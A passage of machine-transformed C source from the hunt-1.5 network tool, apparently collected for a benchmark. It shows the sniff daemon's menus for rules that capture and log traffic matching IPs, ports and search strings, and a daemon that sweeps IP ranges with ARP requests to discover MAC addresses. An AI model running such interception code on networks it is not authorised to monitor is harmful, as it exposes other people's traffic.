  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;
  void *tmp___6 ;
  size_t tmp___7 ;
  void *tmp___8 ;

  {
  {
#line 663
  tmp = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                        (unsigned int *)(& src_mask), (unsigned int *)(src_ports),
                                        0U, 0U, (int *)((void *)0));
  }
#line 663
  if (tmp < 0) {
#line 665
    return;
  }
  {
#line 666
  tmp___0 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            (unsigned int *)(& dst_mask), (unsigned int *)(dst_ports),
                                            0U, 0U, (int *)((void *)0));
  }
#line 666
  if (tmp___0 < 0) {
#line 668
    return;
  }
  {
#line 669
  buf_p = (char *)((void *)0);
#line 670
  srch_mode = 'b';
#line 671
  tmp___1 = menu_choose_char((char *)"want to search for y/n", (char *)"yn", (char )'y');
  }
  {
#line 672
  if (tmp___1 == 121) {
#line 672
    goto case_121;
  }
#line 671
  goto switch_break;
  case_121: /* CIL Label */ 
  {
#line 673
  srch_mode = menu_choose_sdb((char *)"srch_mode", (char )'b');
  }
#line 673
  if (srch_mode == -1) {
#line 674
    return;
  }
  {
#line 675
  tmp___2 = menu_choose_string((char *)"search for", buf, (int )sizeof(buf), (char *)((void *)0));
  }
#line 675
  if (tmp___2 < 0) {
#line 676
    return;
  }
#line 677
  buf_p = buf;
#line 678
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 680
  log_mode = menu_choose_sdb((char *)"log mode", (char )'s');
  }
#line 680
  if (log_mode < 0) {
#line 681
    return;
  }
  {
#line 682
  log_bytes = menu_choose_unr((char *)"log bytes", 0, 1000000000, 64);
  }
#line 682
  if (log_bytes < 0) {
#line 683
    return;
  }
  {
#line 684
  tmp___3 = menu_choose_string((char *)"log file name [by conn]", file_name_buf, (int )sizeof(file_name_buf),
                               (char *)((void *)0));
  }
#line 684
  if (tmp___3 < 0) {
#line 685
    file_name_buf[0] = (char)0;
  }
  {
#line 686
  tmp___4 = list_count(& l_sniff_db);
#line 686
  tmp___5 = list_count(& l_sniff_db);
#line 686
  nr = menu_choose_unr((char *)"insert at", 0, tmp___5, tmp___4);
  }
#line 686
  if (nr == -1) {
#line 687
    return;
  }
#line 689
  if (file_name_buf[0]) {
    {
#line 690
    sprintf((char */* __restrict  */)(file_name), (char const   */* __restrict  */)"%s/%s",
            ".sniff", file_name_buf);
#line 691
    f = fopen((char const   */* __restrict  */)(file_name), (char const   */* __restrict  */)"a+");
    }
#line 691
    if (! f) {
      {
#line 692
      printf((char const   */* __restrict  */)"can\'t open %s for writing\n", file_name);
      }
#line 693
      return;
    }
  } else {
#line 696
    f = (FILE *)((void *)0);
  }
  {
#line 697
  tmp___6 = malloc(sizeof(struct sniff_info ));
#line 697
  si = (struct sniff_info *)tmp___6;
#line 698
  memset((void *)si, 0, sizeof(struct sniff_info ));
#line 699
  pthread_mutex_init(& si->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 700
  pthread_cond_init((pthread_cond_t */* __restrict  */)(& si->lock_cond), (pthread_condattr_t const   */* __restrict  */)((void *)0));
#line 701
  si->lock_count = 0;
#line 702
  list_init(& si->log, (int )((char *)(& ((struct sniff_log *)0)->next) - (char *)0));
#line 703
  si->src_addr = src_ip;
#line 704
  si->src_mask = src_mask;
#line 705
  port_htons((unsigned int *)(src_ports));
#line 706
  memcpy((void */* __restrict  */)(si->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 707
  si->dst_addr = dst_ip;
#line 708
  si->dst_mask = dst_mask;
#line 709
  port_htons((unsigned int *)(dst_ports));
#line 710
  memcpy((void */* __restrict  */)(si->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 711
  si->srch_mode = sdb_to_int((char )srch_mode);
  }
#line 713
  if (buf_p) {
    {
#line 714
    tmp___7 = strlen((char const   *)buf_p);
#line 714
    len = (int )(tmp___7 + 1UL);
#line 715
    tmp___8 = malloc((size_t )len);
#line 715
    si->search = (char *)tmp___8;
    }
#line 716
    if (! si->search) {
      {
#line 716
      __assert_fail("si->search", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c",
                    716U, "sniff_add_item");
      }
    }
    {
#line 717
    memcpy((void */* __restrict  */)si->search, (void const   */* __restrict  */)buf_p,
           (size_t )len);
    }
  }
  {
#line 719
  si->log_mode = sdb_to_int((char )log_mode);
#line 720
  si->log_bytes = log_bytes;
  }
#line 721
  if (f) {
#line 722
    si->file = f;
#line 723
    si->file_close = 1;
  } else {
#line 725
    si->file_close = 0;
  }
  {
#line 726
  list_insert_at(& l_sniff_db, nr, (void *)si);
  }
#line 727
  return;
}
}
#line 729 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_mod_item(void) 
{ 
  char buf[512] ;
  char *buf_p ;
  struct sniff_info *si ;
  struct sniff_log *slog ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  int src_mask ;
  int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int srch_mode ;
  int len ;
  int log_mode ;
  int log_bytes ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  char tmp___5 ;
  int tmp___6 ;
  char tmp___7 ;
  void *tmp___8 ;
  size_t tmp___9 ;
  void *tmp___10 ;

  {
  {
#line 741
  sniff_list_db(0);
#line 742
  tmp = list_count(& l_sniff_db);
#line 742
  tmp___0 = list_count(& l_sniff_db);
#line 742
  nr = menu_choose_unr((char *)"choose item", 0, tmp___0 - 1, tmp - 1);
  }
#line 742
  if (nr == -1) {
#line 743
    return;
  }
  {
#line 744
  tmp___1 = list_at(& l_sniff_db, nr);
#line 744
  si = (struct sniff_info *)tmp___1;
  }
#line 744
  if (! si) {
#line 745
    return;
  }
  {
#line 746
  tmp___2 = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                            (unsigned int *)(& src_mask), (unsigned int *)(src_ports),
                                            si->src_addr, (unsigned int )si->src_mask,
                                            si->src_ports);
  }
#line 746
  if (tmp___2 < 0) {
#line 749
    return;
  }
  {
#line 750
  tmp___3 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            (unsigned int *)(& dst_mask), (unsigned int *)(dst_ports),
                                            si->dst_addr, (unsigned int )si->dst_mask,
                                            si->dst_ports);
  }
#line 750
  if (tmp___3 < 0) {
#line 753
    return;
  }
  {
#line 754
  buf_p = (char *)((void *)0);
#line 755
  srch_mode = 'b';
#line 756
  tmp___4 = menu_choose_char((char *)"want to search for y/n", (char *)"yn", (char )'y');
  }
  {
#line 757
  if (tmp___4 == 121) {
#line 757
    goto case_121;
  }
#line 756
  goto switch_break;
  case_121: /* CIL Label */ 
  {
#line 758
  tmp___5 = int_to_sdb(si->srch_mode);
#line 758
  srch_mode = menu_choose_sdb((char *)"srch_mode", tmp___5);
  }
#line 758
  if (srch_mode < 0) {
#line 759
    return;
  }
  {
#line 760
  tmp___6 = menu_choose_string((char *)"search for", buf, (int )sizeof(buf), si->search);
  }
#line 760
  if (tmp___6 < 0) {
#line 761
    return;
  }
#line 762
  buf_p = buf;
#line 763
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 765
  tmp___7 = int_to_sdb(si->log_mode);
#line 765
  log_mode = menu_choose_sdb((char *)"log mode", tmp___7);
  }
#line 765
  if (log_mode < 0) {
#line 766
    return;
  }
  {
#line 767
  log_bytes = menu_choose_unr((char *)"log bytes", 0, 1000000000, si->log_bytes);
  }
#line 767
  if (log_bytes < 0) {
#line 768
    return;
  }
  {
#line 770
  port_htons((unsigned int *)(src_ports));
#line 771
  port_htons((unsigned int *)(dst_ports));
#line 773
  list_lock(& l_sniff_db);
#line 774
  pthread_mutex_lock(& si->mutex);
  }
  {
#line 775
  while (1) {
    while_continue: /* CIL Label */ ;
#line 775
    if (! (si->lock_count > 0)) {
#line 775
      goto while_break;
    }
    {
#line 776
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& si->lock_cond), (pthread_mutex_t */* __restrict  */)(& si->mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 777
  while (1) {
    while_continue___0: /* CIL Label */ ;
    {
#line 777
    tmp___8 = list_pop(& si->log);
#line 777
    slog = (struct sniff_log *)tmp___8;
    }
#line 777
    if (! slog) {
#line 777
      goto while_break___0;
    }
    {
#line 778
    free_sniff_log(slog);
    }
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 779
  si->src_addr = src_ip;
#line 780
  si->src_mask = src_mask;
#line 781
  memcpy((void */* __restrict  */)(si->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 782
  si->dst_addr = dst_ip;
#line 783
  si->dst_mask = dst_mask;
#line 784
  memcpy((void */* __restrict  */)(si->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 785
  si->srch_mode = sdb_to_int((char )srch_mode);
  }
#line 786
  if (buf_p) {
    {
#line 787
    free((void *)si->search);
#line 788
    tmp___9 = strlen((char const   *)buf_p);
#line 788
    len = (int )(tmp___9 + 1UL);
#line 789
    tmp___10 = malloc((size_t )len);
#line 789
    si->search = (char *)tmp___10;
    }
#line 790
    if (! si->search) {
      {
#line 790
      __assert_fail("si->search", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c",
                    790U, "sniff_mod_item");
      }
    }
    {
#line 791
    memcpy((void */* __restrict  */)si->search, (void const   */* __restrict  */)buf_p,
           (size_t )len);
    }
  }
  {
#line 793
  si->log_mode = sdb_to_int((char )log_mode);
#line 794
  si->log_bytes = log_bytes;
#line 795
  pthread_mutex_unlock(& si->mutex);
#line 796
  list_unlock(& l_sniff_db);
  }
#line 797
  return;
}
}
#line 799 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_del_item(void) 
{ 
  int i ;
  struct sniff_info *si ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 804
  sniff_list_db(0);
#line 805
  tmp = list_count(& l_sniff_db);
#line 805
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 807
  if (i >= 0) {
    {
#line 808
    list_lock(& l_sniff_db);
#line 809
    tmp___0 = list_remove_at(& l_sniff_db, i);
#line 809
    si = (struct sniff_info *)tmp___0;
#line 810
    sniff_info_wait_for_release(si);
#line 811
    free_sniff_info(si);
#line 812
    list_unlock(& l_sniff_db);
    }
  }
#line 814
  return;
}
}
#line 816 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void newline_option(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 818
  if (o_newline) {
#line 818
    tmp = 'y';
  } else {
#line 818
    tmp = 'n';
  }
  {
#line 818
  tmp___0 = menu_choose_char((char *)"Print newline,... as newline,...", (char *)"yn",
                             (char )tmp);
  }
  {
#line 820
  if (tmp___0 == 121) {
#line 820
    goto case_121;
  }
#line 823
  if (tmp___0 == 110) {
#line 823
    goto case_110;
  }
#line 826
  goto switch_default;
  case_121: /* CIL Label */ 
#line 821
  o_newline = 1;
#line 822
  goto switch_break;
  case_110: /* CIL Label */ 
#line 824
  o_newline = 0;
#line 825
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 827
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 829
  return;
}
}
#line 831 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void sniff_options(void) 
{ 
  char *o_menu ;
  char *o_keys ;
  int run_it ;
  int tmp ;

  {
#line 833
  o_menu = (char *)"n) print new line,... as new line,...\nx) return\n";
#line 835
  o_keys = (char *)"nx";
#line 838
  run_it = 1;
  {
#line 839
  while (1) {
    while_continue: /* CIL Label */ ;
#line 839
    if (! run_it) {
#line 839
      goto while_break;
    }
    {
#line 840
    tmp = menu((char *)"sniff options", o_menu, (char *)"sniffopt", o_keys, (char)0);
    }
    {
#line 841
    if (tmp == 110) {
#line 841
      goto case_110;
    }
#line 844
    if (tmp == 120) {
#line 844
      goto case_120;
    }
#line 840
    goto switch_break;
    case_110: /* CIL Label */ 
    {
#line 842
    newline_option();
    }
#line 843
    goto switch_break;
    case_120: /* CIL Label */ 
#line 845
    run_it = 0;
#line 846
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 849
  return;
}
}
#line 851 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void sniff_menu(void) 
{ 
  char *r_menu ;
  char *r_keys ;
  int run_it ;
  int tmp ;

  {
#line 853
  r_menu = (char *)"s/k)   start/stop sniff daemon\nl)     list sniff database   c) list sniff connection\na/m/d) add/mod/del sniff item\no)     options\nx)     return\n";
#line 858
  r_keys = (char *)"sklcamdox";
#line 861
  run_it = 1;
  {
#line 862
  while (1) {
    while_continue: /* CIL Label */ ;
#line 862
    if (! run_it) {
#line 862
      goto while_break;
    }
    {
#line 863
    tmp = menu((char *)"sniff daemon", r_menu, (char *)"sniff", r_keys, (char)0);
    }
    {
#line 864
    if (tmp == 115) {
#line 864
      goto case_115;
    }
#line 867
    if (tmp == 107) {
#line 867
      goto case_107;
    }
#line 870
    if (tmp == 108) {
#line 870
      goto case_108;
    }
#line 873
    if (tmp == 99) {
#line 873
      goto case_99;
    }
#line 876
    if (tmp == 97) {
#line 876
      goto case_97;
    }
#line 879
    if (tmp == 109) {
#line 879
      goto case_109;
    }
#line 882
    if (tmp == 100) {
#line 882
      goto case_100;
    }
#line 885
    if (tmp == 111) {
#line 885
      goto case_111;
    }
#line 888
    if (tmp == 120) {
#line 888
      goto case_120;
    }
#line 863
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 865
    start_sniff();
    }
#line 866
    goto switch_break;
    case_107: /* CIL Label */ 
    {
#line 868
    stop_sniff();
    }
#line 869
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 871
    sniff_list_db(0);
    }
#line 872
    goto switch_break;
    case_99: /* CIL Label */ 
    {
#line 874
    sniff_list_db(1);
    }
#line 875
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 877
    sniff_add_item();
    }
#line 878
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 880
    sniff_mod_item();
    }
#line 881
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 883
    sniff_del_item();
    }
#line 884
    goto switch_break;
    case_111: /* CIL Label */ 
    {
#line 886
    sniff_options();
    }
#line 887
    goto switch_break;
    case_120: /* CIL Label */ 
#line 889
    run_it = 0;
#line 890
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 893
  return;
}
}
#line 576 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
void mac_discover_range(unsigned int start_ip , unsigned int end_ip , int count___0 ) ;
#line 17 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
void mac_discover_range(unsigned int start_ip , unsigned int end_ip , int count___0 ) 
{ 
  unsigned int addr ;
  unsigned int j ;
  struct timespec ts ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;

  {
#line 22
  j = 1U;
  {
#line 22
  while (1) {
    while_continue: /* CIL Label */ ;
#line 22
    if (! (j <= (unsigned int )count___0)) {
#line 22
      goto while_break;
    }
#line 23
    addr = start_ip;
    {
#line 23
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 23
      tmp___0 = ntohl(addr);
#line 23
      tmp___1 = ntohl(end_ip);
      }
#line 23
      if (! (tmp___0 <= tmp___1)) {
#line 23
        goto while_break___0;
      }
      {
#line 26
      mac_discover(addr, 1);
#line 23
      tmp = ntohl(addr);
#line 23
      addr = htonl(tmp + 1U);
      }
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 28
    ts.tv_sec = (__time_t )0;
#line 29
    ts.tv_nsec = (__syscall_slong_t )200000000;
#line 30
    nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 22
    j ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 32
  return;
}
}
#line 34 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
void mac_discover(unsigned int ip , int count___0 ) 
{ 
  struct arp_spec as ;
  struct timespec ts ;
  int i ;
  uint16_t tmp ;

  {
  {
#line 40
  as.src_mac = (char *)(my_eth_mac);
#line 41
  as.dst_mac = (char *)(mac_broadcast);
#line 42
  tmp = htons((uint16_t )1);
#line 42
  as.oper = (int )tmp;
#line 43
  as.sender_mac = (char *)(my_eth_mac);
#line 44
  as.sender_addr = (unsigned long )my_eth_ip;
#line 45
  as.target_mac = (char *)(mac_zero);
#line 46
  as.target_addr = (unsigned long )ip;
#line 48
  ts.tv_sec = (__time_t )0;
#line 49
  ts.tv_nsec = (__syscall_slong_t )100000000;
#line 50
  i = 0;
  }
  {
#line 50
  while (1) {
    while_continue: /* CIL Label */ ;
#line 50
    if (! (i < count___0)) {
#line 50
      goto while_break;
    }
    {
#line 51
    send_arp_packet(& as);
    }
#line 52
    if (i < count___0 - 1) {
      {
#line 53
      nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
      }
    }
#line 50
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 58
  return;
}
}
#line 71 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static struct list l_mdi  = 
#line 71
     {(void *)0, (void *)0, (int )((char *)(& ((struct mac_disc_info *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int wait_sec  =    300;
#line 74 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int volatile   stop_break  =    (int volatile   )0;
#line 75 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int thr_running  =    0;
#line 76 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static pthread_t mac_thr  ;
#line 77 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int volatile   stop  =    (int volatile   )0;
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static pthread_mutex_t mutex_stop  =    {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0, (struct __pthread_internal_list *)0}}};
#line 79 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static pthread_cond_t cond_stop  =    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}};
#line 81 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void *mac_disc_thr(void *arg ) 
{ 
  struct list_iterator li ;
  struct mac_disc_info *mdi ;
  unsigned int addr ;
  struct timeval tv ;
  struct timespec ts ;
  int retval ;
  __pid_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 90
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 91
  tmp = getpid();
#line 91
  setpriority(0, (id_t )tmp, 10);
#line 92
  stop_break = (int volatile   )0;
  }
  {
#line 93
  while (1) {
    while_continue: /* CIL Label */ ;
#line 93
    if (! (! stop)) {
#line 93
      goto while_break;
    }
    {
#line 94
    list_iter_set(& li, & l_mdi);
    }
    {
#line 95
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 95
      tmp___3 = list_iter_get(& li);
#line 95
      mdi = (struct mac_disc_info *)tmp___3;
      }
#line 95
      if (mdi) {
#line 95
        if (! (! stop)) {
#line 95
          goto while_break___0;
        }
      } else {
#line 95
        goto while_break___0;
      }
#line 96
      addr = mdi->start_addr;
      {
#line 96
      while (1) {
        while_continue___1: /* CIL Label */ ;
        {
#line 96
        tmp___1 = ntohl(addr);
#line 96
        tmp___2 = ntohl(mdi->end_addr);
        }
#line 96
        if (tmp___1 <= tmp___2) {
#line 96
          if (! (! stop)) {
#line 96
            goto while_break___1;
          }
        } else {
#line 96
          goto while_break___1;
        }
        {
#line 99
        mac_discover(addr, 1);
#line 96
        tmp___0 = ntohl(addr);
#line 96
        addr = htonl(tmp___0 + 1U);
        }
      }
      while_break___1: /* CIL Label */ ;
      }
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 102
    list_iter_end(& li);
#line 103
    pthread_mutex_lock(& mutex_stop);
#line 104
    retval = 0;
#line 105
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 106
    ts.tv_sec = tv.tv_sec + (__time_t )wait_sec;
#line 107
    ts.tv_nsec = tv.tv_usec * 1000L;
    }
    {
#line 108
    while (1) {
      while_continue___2: /* CIL Label */ ;
#line 108
      if (! stop) {
#line 108
        if (retval != 110) {
#line 108
          if (! (! stop_break)) {
#line 108
            goto while_break___2;
          }
        } else {
#line 108
          goto while_break___2;
        }
      } else {
#line 108
        goto while_break___2;
      }
      {
#line 109
      retval = pthread_cond_timedwait((pthread_cond_t */* __restrict  */)(& cond_stop),
                                      (pthread_mutex_t */* __restrict  */)(& mutex_stop),
                                      (struct timespec  const  */* __restrict  */)(& ts));
      }
    }
    while_break___2: /* CIL Label */ ;
    }
    {
#line 110
    pthread_mutex_unlock(& mutex_stop);
#line 111
    stop_break = (int volatile   )0;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 113
  return ((void *)0);
}
}
#line 117 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int start_mac_discovery(void) 
{ 


  {
#line 119
  if (thr_running) {
    {
#line 120
    printf((char const   */* __restrict  */)"mac discoverer already running\n");
    }
#line 121
    return (-1);
  }
  {
#line 123
  pthread_mutex_init(& mutex_stop, (pthread_mutexattr_t const   *)((void *)0));
#line 124
  pthread_cond_init((pthread_cond_t */* __restrict  */)(& cond_stop), (pthread_condattr_t const   */* __restrict  */)((void *)0));
#line 125
  stop = (int volatile   )0;
#line 126
  pthread_create((pthread_t */* __restrict  */)(& mac_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 & mac_disc_thr, (void */* __restrict  */)((void *)0));
#line 127
  thr_running = 1;
  }
#line 128
  return (0);
}
}
#line 131 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static int stop_mac_discovery(void) 
{ 


  {
#line 133
  if (! thr_running) {
    {
#line 134
    printf((char const   */* __restrict  */)"mac discoverer isn\'t running\n");
    }
#line 135
    return (-1);
  }
  {
#line 137
  stop = (int volatile   )1;
#line 138
  pthread_mutex_lock(& mutex_stop);
#line 139
  pthread_cond_signal(& cond_stop);
#line 140
  pthread_mutex_unlock(& mutex_stop);
#line 141
  pthread_join(mac_thr, (void **)((void *)0));
#line 142
  thr_running = 0;
  }
#line 143
  return (0);
}
}
#line 146 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
void print_mac_daemon(void) 
{ 
  int tmp ;

  {
#line 148
  if (thr_running) {
    {
#line 149
    tmp = pthread_kill(mac_thr, 0);
    }
#line 149
    if (tmp != 0) {
      {
#line 150
      pthread_join(mac_thr, (void **)((void *)0));
#line 151
      mac_thr = (pthread_t )0;
#line 152
      thr_running = 0;
#line 153
      set_tty_color((enum TTY_COLOR )9);
#line 154
      printf((char const   */* __restrict  */)"MAC daemon failed - bug\n");
#line 155
      set_tty_color((enum TTY_COLOR )7);
      }
    } else {
      {
#line 157
      printf((char const   */* __restrict  */)"M");
      }
    }
  }
#line 159
  return;
}
}
#line 165 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void mdi_list(void) 
{ 
  struct list_iterator li ;
  struct mac_disc_info *mdi ;
  int count___0 ;
  char *tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  void *tmp___2 ;

  {
  {
#line 169
  count___0 = 0;
#line 171
  list_iter_set(& li, & l_mdi);
  }
  {
#line 172
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 172
    tmp___2 = list_iter_get(& li);
#line 172
    mdi = (struct mac_disc_info *)tmp___2;
    }
#line 172
    if (! mdi) {
#line 172
      goto while_break;
    }
    {
#line 173
    tmp = host_lookup(mdi->end_addr, hl_mode);
#line 173
    tmp___0 = host_lookup(mdi->start_addr, hl_mode);
#line 173
    tmp___1 = count___0;
#line 173
    count___0 ++;
#line 173
    printf((char const   */* __restrict  */)"%2d) %-24s - %-24s\n", tmp___1, tmp___0,
           tmp);
    }
#line 176
    if (count___0 % lines_o == 0) {
      {
#line 177
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 179
  list_iter_end(& li);
  }
#line 180
  return;
}
}
#line 182 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void mdi_add(void) 
{ 
  struct mac_disc_info *mdi ;
  unsigned int start_ip ;
  unsigned int end_ip ;
  void *tmp ;

  {
  {
#line 187
  start_ip = menu_choose_hostname((char *)"start ip addr", (char *)((void *)0));
  }
#line 187
  if (start_ip == 4294967295U) {
#line 188
    return;
  }
  {
#line 189
  end_ip = menu_choose_hostname((char *)"end ip addr", (char *)((void *)0));
  }
#line 189
  if (end_ip == 4294967295U) {
#line 190
    return;
  }
  {
#line 191
  tmp = malloc(sizeof(struct mac_disc_info ));
#line 191
  mdi = (struct mac_disc_info *)tmp;
  }
#line 192
  if (! mdi) {
    {
#line 192
    __assert_fail("mdi", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c",
                  192U, "mdi_add");
    }
  }
  {
#line 193
  mdi->start_addr = start_ip;
#line 194
  mdi->end_addr = end_ip;
#line 195
  list_enqueue(& l_mdi, (void *)mdi);
  }
#line 196
  return;
}
}
#line 198 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void mdi_mod(void) 
{ 
  struct mac_disc_info *mdi ;
  unsigned int start_ip ;
  unsigned int end_ip ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  char *tmp___2 ;
  char *tmp___3 ;

  {
  {
#line 204
  mdi_list();
#line 205
  tmp = list_count(& l_mdi);
#line 205
  tmp___0 = list_count(& l_mdi);
#line 205
  nr = menu_choose_unr((char *)"choose item", 0, tmp___0 - 1, tmp - 1);
  }
#line 205
  if (nr == -1) {
#line 206
    return;
  }
  {
#line 207
  tmp___1 = list_at(& l_mdi, nr);
#line 207
  mdi = (struct mac_disc_info *)tmp___1;
  }
#line 207
  if (! mdi) {
#line 208
    return;
  }
  {
#line 210
  tmp___2 = host_lookup(mdi->start_addr, hl_mode);
#line 210
  start_ip = menu_choose_hostname((char *)"start ip addr", tmp___2);
  }
#line 210
  if (start_ip == 4294967295U) {
#line 211
    return;
  }
  {
#line 212
  tmp___3 = host_lookup(mdi->end_addr, hl_mode);
#line 212
  end_ip = menu_choose_hostname((char *)"end ip addr", tmp___3);
  }
#line 212
  if (end_ip == 4294967295U) {
#line 213
    return;
  }
#line 214
  mdi->start_addr = start_ip;
#line 215
  mdi->end_addr = end_ip;
#line 216
  return;
}
}
#line 218 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void mdi_del(void) 
{ 
  int i ;
  struct mac_disc_info *mdi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 223
  mdi_list();
#line 224
  tmp = list_count(& l_mdi);
#line 224
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 226
  if (i >= 0) {
    {
#line 227
    tmp___0 = list_remove_at(& l_mdi, i);
#line 227
    mdi = (struct mac_disc_info *)tmp___0;
#line 228
    free((void *)mdi);
    }
  }
#line 230
  return;
}
}
#line 232 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
static void mdi_time_wait(void) 
{ 
  int min ;
  int sec ;

  {
  {
#line 236
  min = wait_sec / 60;
#line 237
  sec = wait_sec % 60;
#line 238
  min = menu_choose_unr((char *)"choose time interval min", 0, 1000, min);
  }
#line 238
  if (min == -1) {
#line 239
    return;
  }
  {
#line 240
  sec = menu_choose_unr((char *)"choose time interval sec", 0, 10000, sec);
  }
#line 240
  if (sec == -1) {
#line 241
    return;
  }
  {
#line 242
  wait_sec = min * 60 + sec;
#line 244
  stop_break = (int volatile   )1;
#line 245
  pthread_mutex_lock(& mutex_stop);
#line 246
  pthread_cond_signal(& cond_stop);
#line 247
  pthread_mutex_unlock(& mutex_stop);
  }
#line 248
  return;
}
}
#line 250 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/macdisc.c"
void mac_disc_menu(void) 
{ 
  char *m_menu ;
  char *m_keys ;
  int run_it ;
  int tmp ;

  {
#line 252
  m_menu = (char *)"s/k)   start/stop daemon\nl)     list discoverer setup     h) list HW mac addresses\nt)     time to sleep\na/m/d) add/mod/del entry\nx)     return\n";
#line 257
  m_keys = (char *)"sklhtadmx";
#line 260
  run_it = 1;
  {
#line 261
  while (1) {
    while_continue: /* CIL Label */ ;
#line 261
    if (! run_it) {
#line 261
      goto while_break;
    }
    {
#line 262
    tmp = menu((char *)"mac disc. daemon", m_menu, (char *)"macd", m_keys, (char)0);
    }
    {
#line 263
    if (tmp == 115) {
#line 263
